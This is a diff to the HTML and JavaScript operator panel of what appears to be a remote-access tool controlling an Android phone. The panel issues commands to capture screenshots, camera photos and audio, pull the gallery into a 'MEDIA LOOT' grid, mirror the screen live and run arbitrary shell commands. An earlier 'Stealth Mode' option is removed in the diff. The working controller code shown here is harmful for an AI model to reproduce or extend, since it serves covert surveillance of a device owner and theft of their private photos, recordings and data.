@@ -131,13 +131,56 @@
         /* SCROLLBAR */
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
-
+    </style>
+    <style>
+        /* [v14.0 PRO] Floating Mirror Window */
+        .mirror-window {
+            position: fixed; top: 20px; right: 20px; width: 280px; height: 600px;
+            background: #000; border: 2px solid var(--accent); border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 242, 255, 0.3); z-index: 1000;
+            display: none; flex-direction: column; overflow: hidden;
+            transition: 0.3s;
+        }
+        .mirror-header {
+            padding: 10px; background: rgba(0, 242, 255, 0.1); display: flex; 
+            justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border);
+        }
+        .mirror-body { flex: 1; position: relative; }
+        .mirror-img { width: 100%; height: 100%; object-fit: cover; }
+        .mirror-status { 
+            position: absolute; bottom: 10px; left: 10px; font-size: 0.6rem; 
+            color: var(--success); text-shadow: 0 0 5px #000; 
+        }
+        
+        .reconnect-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 2000;
+            display: none; justify-content: center; align-items: center;
+            color: var(--accent); font-family: 'Orbitron', sans-serif;
+        }
     </style>
 </head>
 <body>
 
+    <div id="reconnect-ui" class="reconnect-overlay">
+        <div style="text-align:center;">
+            <div style="font-size:1.5rem; margin-bottom:10px;">⚠️ CONNECTION LOST</div>
+            <div class="status-badge" style="display:inline-flex;">RE-ESTABLISHING NEURAL LINK...</div>
+        </div>
+    </div>
+
+    <div id="floating-mirror" class="mirror-window">
+        <div class="mirror-header">
+            <span style="font-size:0.7rem; color:var(--accent);">🔴 LIVE MIRROR</span>
+            <span onclick="toggleMirror()" style="cursor:pointer; color:#ff4444;">✖</span>
+        </div>
+        <div class="mirror-body">
+            <img id="mirror-stream" class="mirror-img" src="" alt="Live Stream">
+            <div id="mirror-ts" class="mirror-status">SYNCING...</div>
+        </div>
+    </div>
+
     <div class="commander-layout">
-        <!-- MASTER MENU -->
+        <!-- ... existing layout ... -->
         <nav class="glass master-menu">
             <div class="menu-icon active" onclick="showPage('vision', this)" title="Vision Hub">👁️</div>
             <div class="menu-icon" onclick="showPage('sensors', this)" title="Sensors">📡</div>
@@ -148,37 +191,42 @@
             <div class="menu-icon" onclick="showPage('system', this)" title="System Matrix">⚙️</div>
         </nav>
 
-        <!-- SUB MENU (Contextual) -->
-        <aside class="glass sub-menu" id="sub-menu-container">
-            <!-- Dynamic Content -->
-        </aside>
+        <aside class="glass sub-menu" id="sub-menu-container"></aside>
 
-        <!-- MAIN CONTENT -->
         <main class="glass content-area">
             <header class="page-header">
                 <div class="page-title" id="page-title">VISION HUB</div>
-                <div class="status-badge">
-                    <span style="width: 8px; height: 8px; background: var(--success); border-radius: 50%;"></span>
-                    SYNC: REDMI_NOTE_14 [v14.0]
+                <div style="display:flex; gap:15px; align-items:center;">
+                    <button onclick="toggleMirror()" class="status-badge" style="background:none; cursor:pointer; border-color:var(--accent); color:var(--accent);">📺 POP-OUT MIRROR</button>
+                    <div class="status-badge" id="main-status-badge">
+                        <span id="status-dot" style="width: 8px; height: 8px; background: var(--success); border-radius: 50%;"></span>
+                        <span id="status-text">SYNC: REDMI_NOTE_14</span>
+                    </div>
                 </div>
             </header>
             
-            <div class="view-frame" id="main-view">
-                <!-- Page Content Injected Here -->
-            </div>
+            <div class="view-frame" id="main-view"></div>
         </main>
     </div>
 
     <script>
         const API = "/api";
         let currentPage = 'vision';
+        let isMirroring = false;
+        let failCount = 0;
+
+        function toggleMirror() {
+            const m = document.getElementById('floating-mirror');
+            isMirroring = !isMirroring;
+            m.style.display = isMirroring ? 'flex' : 'none';
+        }
 
         const PAGES = {
             vision: {
                 title: "VISION HUB",
                 menu: [
                     { label: "Capture Screen", cmd: 'screenshot' },
-                    { label: "Real-time Mirroring", cmd: 'screenshot', auto: true },
+                    { label: "Pop-out Mirror", cmd: 'mirror_ui', custom: toggleMirror },
                     { label: "Extract UI Metadata", cmd: 'ui_dump' }
                 ],
                 render: () => `<img id="v-stream" class="vision-feed" src="/api/asset/latest" alt="Vision Stream">`
@@ -188,31 +236,28 @@
                 menu: [
                     { label: "Back Camera Photo", cmd: 'camera_back' },
                     { label: "Front Camera Photo", cmd: 'camera_front' },
-                    { label: "Record Audio (10s)", cmd: 'audio_record' },
-                    { label: "Capture Environment", cmd: 'camera_back' }
+                    { label: "Record Audio (10s)", cmd: 'audio_record' }
                 ],
-                render: () => `<div style="padding:40px; text-align:center; color:#556;">SENSOR STREAM ACTIVE. SELECT ACTION FROM LIST.</div>`
+                render: () => `<div style="padding:40px; text-align:center; color:#556;">SENSOR STREAM ACTIVE.</div>`
             },
             loot: {
                 title: "MEDIA LOOT",
                 menu: [
                     { label: "Sync Gallery", cmd: 'gallery_sync' },
-                    { label: "Fetch All Assets", cmd: 'assets_fetch' },
-                    { label: "Clear Loot Storage", cmd: 'loot_clear' }
+                    { label: "Fetch All Assets", cmd: 'assets_fetch' }
                 ],
                 render: () => `<div class="loot-grid" id="loot-grid">Loading assets...</div>`
             },
             chat: {
                 title: "NEURAL INTERACTION",
                 menu: [
-                    { label: "Clear History", cmd: 'chat_clear' },
-                    { label: "Export Logs", cmd: 'chat_export' }
+                    { label: "Clear History", cmd: 'chat_clear' }
                 ],
                 render: () => `
                     <div class="chat-container">
                         <div class="chat-msgs" id="chat-box"></div>
                         <div class="chat-input">
-                            <input type="text" id="chat-in" placeholder="Query agent or enter shell command..." onkeypress="handleIn(event)">
+                            <input type="text" id="chat-in" placeholder="Query agent..." onkeypress="handleIn(event)">
                             <button onclick="sendChat()" class="menu-item" style="margin:0; width:auto;">SEND</button>
                         </div>
                     </div>
@@ -226,40 +271,31 @@
                 ],
                 render: () => `
                     <div style="padding:25px;">
-                        <h4 style="color:var(--gold); margin-bottom:15px;">Skill Manifest:</h4>
-                        <div id="skill-box">Loading manifest...</div>
-                        <h4 style="color:var(--gold); margin:20px 0 10px;">Upgrade Proposals:</h4>
-                        <div id="proposal-box" style="color:#aaa; font-style:italic;">Analyzing behavioral patterns...</div>
+                        <h4 style="color:var(--gold);">Skill Manifest:</h4>
+                        <div id="skill-box">Loading...</div>
+                        <h4 style="color:var(--gold); margin-top:20px;">Upgrade Proposals:</h4>
+                        <div id="proposal-box">Analyzing...</div>
                     </div>
                 `
             },
             browser: {
                 title: "GLOBAL RESEARCH",
                 menu: [
-                    { label: "YouTube Research", url: 'https://www.youtube.com/embed/dQw4w9WgXcQ' },
-                    { label: "Gemini AI Portal", url: 'https://gemini.google.com' },
-                    { label: "ChatGPT Matrix", url: 'https://chat.openai.com' }
+                    { label: "Gemini AI", url: 'https://gemini.google.com' },
+                    { label: "YouTube Matrix", url: 'https://www.youtube.com/embed/dQw4w9WgXcQ' }
                 ],
-                render: () => `<iframe id="b-frame" class="browser-frame" src="https://www.google.com/search?q=ai+agent+learning&igu=1"></iframe>`
+                render: () => `<iframe id="b-frame" class="browser-frame" src="https://www.google.com/search?q=ai+agent&igu=1"></iframe>`
             },
             system: {
                 title: "SYSTEM MATRIX",
                 menu: [
-                    { label: "Auto-Update System", cmd: 'update' },
-                    { label: "Cache Purge & Heal", cmd: 'heal' },
-                    { label: "Cold Reboot Agent", cmd: 'reboot' },
-                    { label: "Stealth Mode", cmd: 'stealth', params: {enabled: true} }
+                    { label: "Auto-Update", cmd: 'update' },
+                    { label: "Force Reboot", cmd: 'reboot' }
                 ],
                 render: () => `
                     <div style="padding:25px; display:grid; grid-template-columns:1fr 1fr; gap:20px;">
-                        <div class="glass" style="padding:15px;">
-                            <div style="color:var(--gold);">CPU STATUS</div>
-                            <div id="s-cpu" style="font-size:2rem; font-weight:700;">0%</div>
-                        </div>
-                        <div class="glass" style="padding:15px;">
-                            <div style="color:var(--gold);">RAM STATUS</div>
-                            <div id="s-ram" style="font-size:2rem; font-weight:700;">0%</div>
-                        </div>
+                        <div class="glass" style="padding:15px;"><div>CPU</div><div id="s-cpu">0%</div></div>
+                        <div class="glass" style="padding:15px;"><div>RAM</div><div id="s-ram">0%</div></div>
                     </div>
                 `
             }
@@ -268,31 +304,19 @@
         function showPage(pageId, el) {
             currentPage = pageId;
             const page = PAGES[pageId];
-            
-            // Update Icons
             document.querySelectorAll('.menu-icon').forEach(i => i.classList.remove('active'));
             if(el) el.classList.add('active');
-
-            // Update Title
             document.getElementById('page-title').innerText = page.title;
-
-            // Update Sub-Menu
             const sub = document.getElementById('sub-menu-container');
-            sub.innerHTML = `
-                <div class="menu-title">${pageId.toUpperCase()} CONTROL</div>
-                ${page.menu.map(item => `
-                    <div class="menu-item" onclick="${item.url ? `loadURL('${item.url}')` : `executeCmd('${item.cmd}', ${JSON.stringify(item.params || {})})`}">
+            sub.innerHTML = `<div class="menu-title">${pageId.toUpperCase()}</div>` + 
+                page.menu.map(item => `
+                    <div class="menu-item" onclick="${item.custom ? `toggleMirror()` : item.url ? `loadURL('${item.url}')` : `executeCmd('${item.cmd}', ${JSON.stringify(item.params || {})})`}">
                         ${item.label}
                     </div>
-                `).join('')}
-            `;
-
-            // Render Content
+                `).join('');
             document.getElementById('main-view').innerHTML = page.render();
-
             if(pageId === 'loot') loadLoot();
             if(pageId === 'evolution') loadEvolution();
-            if(pageId === 'chat') syncChat();
         }
 
         async function executeCmd(type, params={}) {
@@ -300,33 +324,48 @@
                 const res = await fetch(`${API}/command`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: { type, ...params }, description: type })
+                    body: JSON.stringify({ action: { type, ...params } })
                 });
-                const data = await res.json();
-                alert(`Command Broadcasted: ${data.command_id}`);
-            } catch (e) { alert("Broadcast Failed."); }
+                return await res.json();
+            } catch (e) { console.error("Command failed."); }
         }
 
-        function loadURL(url) {
-            const frame = document.getElementById('b-frame');
-            if(frame) frame.src = url;
+        async function syncStatus() {
+            try {
+                const r = await fetch(`${API}/status`);
+                const d = await r.json();
+                failCount = 0;
+                document.getElementById('reconnect-ui').style.display = 'none';
+                
+                if(d.agent) {
+                    const s = d.agent.stats || {};
+                    if(document.getElementById('s-cpu')) document.getElementById('s-cpu').innerText = `${s.cpu}%`;
+                    if(document.getElementById('s-ram')) document.getElementById('s-ram').innerText = `${s.ram}%`;
+                    
+                    const assetUrl = `${API}/asset/${d.agent.last_screenshot}?t=${Date.now()}`;
+                    if(currentPage === 'vision') document.getElementById('v-stream').src = assetUrl;
+                    if(isMirroring) {
+                        document.getElementById('mirror-stream').src = assetUrl;
+                        document.getElementById('mirror-ts').innerText = `LAST SYNC: ${new Date().toLocaleTimeString()}`;
+                    }
+                }
+            } catch(e) {
+                failCount++;
+                if(failCount > 3) document.getElementById('reconnect-ui').style.display = 'flex';
+            }
         }
 
         async function loadLoot() {
             const r = await fetch(`${API}/assets`);
-            const data = await r.json();
+            const d = await r.json();
             const grid = document.getElementById('loot-grid');
-            if(grid) grid.innerHTML = data.map(asset => `
-                <div class="loot-card" onclick="window.open('${API}/asset/${asset.key}')">
-                    <img src="${API}/asset/${asset.key}" alt="Asset">
-                </div>
-            `).join('');
+            if(grid) grid.innerHTML = d.map(a => `<div class="loot-card" onclick="window.open('${API}/asset/${a.key}')"><img src="${API}/asset/${a.key}"></div>`).join('');
         }
 
         async function loadEvolution() {
             const r = await fetch(`${API}/skills`);
             const d = await r.json();
-            document.getElementById('skill-box').innerHTML = d.active.map(s => `<span style="display:inline-block; padding:5px 10px; background:rgba(255,255,255,0.05); margin:0 5px 5px 0; border-radius:4px; font-size:0.75rem;">${s}</span>`).join('');
+            document.getElementById('skill-box').innerHTML = d.active.map(s => `<span>${s}</span>`).join(' ');
             document.getElementById('proposal-box').innerText = d.proposal;
         }
 
@@ -337,41 +376,18 @@
             if(!val) return;
             addMsg(val, 'user');
             input.value = '';
-            // Logic for shell vs chat
-            if(val.startsWith('/')) executeCmd('shell', {cmd: val.substring(1)});
-            else addMsg("Agent: Menganalisis... Menunggu pemrosesan NLU.", 'agent');
+            executeCmd('shell', {cmd: val});
         }
         function addMsg(text, role) {
             const box = document.getElementById('chat-box');
             if(!box) return;
             const d = document.createElement('div');
-            d.className = `msg ${role}`;
-            d.innerText = text;
-            box.appendChild(d);
-            box.scrollTop = box.scrollHeight;
+            d.className = `msg ${role}`; d.innerText = text;
+            box.appendChild(d); box.scrollTop = box.scrollHeight;
         }
 
-        async function syncStatus() {
-            try {
-                const r = await fetch(`${API}/status`);
-                const d = await r.json();
-                if(d.agent) {
-                    const s = d.agent.stats || {};
-                    if(document.getElementById('s-cpu')) document.getElementById('s-cpu').innerText = `${s.cpu || 0}%`;
-                    if(document.getElementById('s-ram')) document.getElementById('s-ram').innerText = `${s.ram || 0}%`;
-                    
-                    if(currentPage === 'vision' && d.agent.last_screenshot) {
-                        const img = document.getElementById('v-stream');
-                        if(img) img.src = `${API}/asset/${d.agent.last_screenshot}?t=${Date.now()}`;
-                    }
-                }
-            } catch(e){}
-        }
-
-        // Init
         showPage('vision');
-        setInterval(syncStatus, 5000);
-
+        setInterval(syncStatus, 3000);
     </script>
 </body>
 </html>
